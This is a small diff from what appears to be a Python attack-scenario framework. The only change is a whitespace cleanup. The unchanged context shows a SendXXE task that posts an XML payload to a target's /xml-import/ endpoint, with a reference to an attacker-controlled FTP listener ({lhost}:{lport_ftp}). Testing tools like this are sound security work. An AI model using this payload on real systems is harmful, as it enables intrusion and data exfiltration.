@@ -35,7 +35,7 @@ class SendXXE(scenarios.Scene):
 
     async def task(self):
         """Post XXE payload using value `userid` stored in local context"""
-        
+
         await self.http_post(
             'http://{rhost}:{rport}/xml-import/'.format(**self.context),
             '<?xml version="1.0" ?><something evil="{userid}">ftp://{lhost}:{lport_ftp}</something>'.format(**self.context)
